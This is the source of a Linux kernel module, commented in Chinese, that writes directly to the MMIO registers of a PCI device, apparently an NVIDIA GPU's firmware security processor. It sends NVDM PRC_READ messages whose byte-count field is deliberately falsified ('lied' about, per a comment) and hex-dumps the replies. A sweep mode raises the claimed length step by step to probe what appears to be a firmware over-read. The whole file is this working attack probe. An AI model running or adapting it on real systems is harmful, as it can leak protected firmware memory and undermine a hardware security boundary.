// fsp_emem_mod.c v4 —— EMEM 双向:发 NVDM 报文 / 读 FSP 回包
// insmod fsp_emem_mod.ko mode=prc_read  numbytes=2 knob=0
// insmod fsp_emem_mod.ko mode=read_reply
// insmod fsp_emem_mod.ko mode=dump
#include <linux/module.h>
#include <linux/pci.h>
#include <linux/io.h>
#include <linux/delay.h>

#define EMEMC(i)  (0x008f2ac0u + (i)*8u)
#define EMEMD(i)  (0x008f2ac4u + (i)*8u)
#define QHEAD(i)  (0x008f2c00u + (i)*8u)
#define QTAIL(i)  (0x008f2c04u + (i)*8u)
#define MQHEAD(i) (0x008f2c80u + (i)*8u)     /* FSP -> RM 消息队列 */
#define MQTAIL(i) (0x008f2c84u + (i)*8u)
#define CH_RM     0u

static char *mode = "dump";
static unsigned numbytes = 2, knob = 0, waitms = 300;
module_param(mode, charp, 0444);
module_param(numbytes, uint, 0444);
module_param(knob, uint, 0444);
module_param(waitms, uint, 0444);

static void put_le32(u8 *p, u32 v){ p[0]=v; p[1]=v>>8; p[2]=v>>16; p[3]=v>>24; }
static void put_le16(u8 *p, u16 v){ p[0]=v; p[1]=v>>8; }

static void read_reply(void __iomem *bar)
{
    u32 head = ioread32(bar + MQHEAD(CH_RM));
    u32 tail = ioread32(bar + MQTAIL(CH_RM));
    u32 size, dw, i;
    if (tail < head) { pr_err("fsp_emem: MSGQ head=%u tail=%u 异常\n", head, tail); return; }
    size = (tail - head);
    pr_err("fsp_emem: MSGQ_HEAD=%u MSGQ_TAIL=%u ⇒ 数据 dwords=%u\n", head, tail, size + 1);
    dw = size + 1; if (dw > 64) dw = 64;
    /* 按驱动做法:offset 归零 + AINCR=1,然后连续读 EMEMD */
    iowrite32((1u << 25), bar + EMEMC(CH_RM));
    { u8 buf[260]; u32 n = 0;
      for (i = 0; i < dw; i++) {
          u32 v = ioread32(bar + EMEMD(CH_RM));
          if (n + 4 < sizeof(buf)) { buf[n++] = v; buf[n++] = v>>8; buf[n++] = v>>16; buf[n++] = v>>24; }
      }
      pr_err("fsp_emem: 回包 %u 字节:", n);
      for (i = 0; i < n; i++) {
          if ((i % 32) == 0 && i) pr_err("fsp_emem:   ...");
          pr_info("");
      }
      { char line[200]; int k, m = 0;
        for (k = 0; k < n && m < 180; k++) m += snprintf(line + m, sizeof(line) - m, "%02x", buf[k]);
        line[m] = 0;
        pr_err("fsp_emem: HEX %s\n", line);
        pr_err("fsp_emem: 前4字节=%02x %02x %02x %02x  (NVDMtype应为0x13/0x15等高字节)\n",
               buf[0], buf[1], buf[2], buf[3]);
      }
    }
}

static void send_msg(void __iomem *bar)
{
    u8 msg[32]; unsigned len = 0, i;
    memset(msg, 0, sizeof(msg));
    put_le32(msg + 0, 0xC0000001u);
    put_le32(msg + 4, 0x7eu | (0x10deu << 8) | (0x13u << 24));   /* NVDM PRC */
    msg[8] = 0x0c;                       /* PRC_OBJ_READ */
    msg[9] = (u8)(numbytes & 0xff);      /* ← 这里就是被"撒谎"的字节数 */
    put_le16(msg + 10, (u16)knob);
    len = 12;
    pr_err("fsp_emem: 发送 PRC_READ knob=%#x numbytes=%u (req[9]=%#x)\n", knob, numbytes, msg[9]);
    iowrite32((1u << 24), bar + EMEMC(CH_RM));      /* offset0 + AINCW */
    for (i = 0; i < len; i += 4) {
        u32 d = 0; unsigned k;
        for (k = 0; k < 4 && i + k < len; k++) d |= ((u32)msg[i+k]) << (8*k);
        iowrite32(d, bar + EMEMD(CH_RM));
    }
    iowrite32((len + 3u) / 4u - 1u, bar + QTAIL(CH_RM));
    iowrite32(0u, bar + QHEAD(CH_RM));
    pr_err("fsp_emem: 已投递(len=%u)\n", len);
}

static int __init fsp_emem_init(void)
{
    struct pci_dev *pdev; void __iomem *bar;
    pdev = pci_get_domain_bus_and_slot(0, 0, PCI_DEVFN(2, 0));
    if (!pdev) return -ENODEV;
    bar = ioremap(pci_resource_start(pdev, 0), 0x900000);
    if (!bar) { pci_dev_put(pdev); return -ENOMEM; }
    pr_err("fsp_emem: mode=%s numbytes=%u knob=%#x  MQHEAD=%u MQTAIL=%u\n",
           mode, numbytes, knob, ioread32(bar+MQHEAD(CH_RM)), ioread32(bar+MQTAIL(CH_RM)));
    if (strcmp(mode, "sweep") == 0) {
        unsigned ns[4] = {2u, 0x40u, 0x100u, 0x800u}; int k;
        for (k = 0; k < 4; k++) {
            u32 h0, t0, h1, t1;
            numbytes = ns[k];
            h0 = ioread32(bar + MQHEAD(CH_RM)); t0 = ioread32(bar + MQTAIL(CH_RM));
            pr_err("fsp_emem: ==== 第%d档 numbytes=%u (发前 MSGQ %u/%u) ====\n", k+1, numbytes, h0, t0);
            send_msg(bar);
            msleep(500);
            h1 = ioread32(bar + MQHEAD(CH_RM)); t1 = ioread32(bar + MQTAIL(CH_RM));
            pr_err("fsp_emem: 发后 MSGQ %u/%u ⇒ 响应字节≈%u\n", h1, t1, (t1 >= h1) ? (t1 - h1 + 4) : 0);
            if (t1 != h1) read_reply(bar);
            iowrite32(t1, bar + MQHEAD(CH_RM));       /* 确认/清空:FSP→RM 队列读指针推进 */
            msleep(120);
        }
    }
    else if (strcmp(mode, "read_reply") == 0) { read_reply(bar); }
    else if (strcmp(mode, "prc_read") == 0) { send_msg(bar); msleep(waitms); read_reply(bar); }
    iounmap(bar); pci_dev_put(pdev);
    return -EINVAL;
}
module_init(fsp_emem_init);
MODULE_LICENSE("GPL");
